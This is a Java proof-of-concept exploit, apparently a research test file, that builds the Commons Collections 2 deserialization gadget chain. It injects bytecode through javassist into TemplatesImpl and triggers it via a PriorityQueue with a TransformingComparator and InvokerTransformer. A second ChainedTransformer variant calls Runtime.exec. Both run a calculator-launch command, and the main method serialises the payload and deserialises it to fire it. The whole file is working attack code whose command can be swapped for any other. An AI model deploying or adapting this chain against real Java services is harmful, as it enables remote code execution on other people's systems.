
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;


public class CommonsCollections2Test {

    private static Object CreateTemplate() throws IllegalAccessException, InstantiationException, NotFoundException, CannotCompileException, IOException, NoSuchFieldException {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass clazz = classPool.makeClass(String.valueOf(System.nanoTime()));
        String string = "java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");";
//        插入作为静态代码块插入插入到类中
//        clazz.makeClassInitializer().insertAfter(string);
        CtConstructor ctConstructor = new CtConstructor(new CtClass[] {}, clazz);
        ctConstructor.setBody(string);
        clazz.addConstructor(ctConstructor);

        CtClass superC = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();
        Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bcField.setAccessible(true);
        bcField.set(templates, new byte[][] {classBytes});
        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "aaaa");
        clazz.writeFile();
        return templates;
    }


    private static Object createPayload() throws Exception {
        final Object templates = CreateTemplate();
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        queue.add(1);
        queue.add(1);
        Field imnField = transformer.getClass().getDeclaredField("iMethodName");
        imnField.setAccessible(true);
        imnField.set(transformer,"newTransformer");
        Field qField = queue.getClass().getDeclaredField("queue");
        qField.setAccessible(true);
        final Object[] queueArray = (Object[]) qField.get(queue);
        queueArray[0] = templates;
        queueArray[1] = 1;
        return queue;
    }

    private static Object createPayloadByOldfunc() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),

                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),

                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),

                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"open /Applications/Calculator.app"}),
        };

        Transformer transformer = new ChainedTransformer(new Transformer[]{});
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        queue.add(1);
        queue.add(1);
        Field tField = transformer.getClass().getDeclaredField("iTransformers");
        tField.setAccessible(true);
        tField.set(transformer,transformers);
        return queue;
    }

    private static void createPayloadFile(Object object, String file)
            throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File(file)));
        objectOutputStream.writeObject(object);
        objectOutputStream.flush();
        objectOutputStream.close();
    }

    private static void payloadTest(String file) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(file));
        Object o = objectInputStream.readObject();
        System.out.println(o);
        objectInputStream.close();
    }

    public static void main(String[] args) throws Exception {
        createPayloadFile(createPayload(),"payload");
        payloadTest("payload");
    }
}
